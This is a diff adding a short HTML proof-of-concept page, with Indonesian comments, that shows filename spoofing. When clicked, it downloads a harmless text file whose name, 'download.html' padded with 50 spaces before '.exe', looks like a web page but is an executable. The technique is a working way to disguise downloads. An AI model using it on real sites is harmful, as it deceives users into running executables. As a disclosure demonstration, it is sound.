@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Filename Spoofing PoC</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 2em;
+    }
+    h1 {
+      color: #ff0;
+    }
+    button {
+      padding: 10px 20px;
+      background: #222;
+      border: 1px solid #0f0;
+      color: #0f0;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Filename Spoofing PoC</h1>
+  <p>Klik tombol di bawah untuk mengunduh file dengan nama spoofed.</p>
+  <button id="dlBtn">Download File</button>
+
+  <script>
+    document.getElementById("dlBtn").addEventListener("click", () => {
+      // Isi file dummy
+      const content = "This is a harmless POC file.\nDemonstrating filename spoofing.";
+      const blob = new Blob([content], { type: "application/octet-stream" });
+
+      // Spoofed filename: terlihat .html tapi sebenarnya .exe
+      const fakeName = "download.html" + " " .repeat(50) + ".exe";
+
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = fakeName; // browser menampilkan nama ini
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    });
+  </script>
+</body>
+</html>
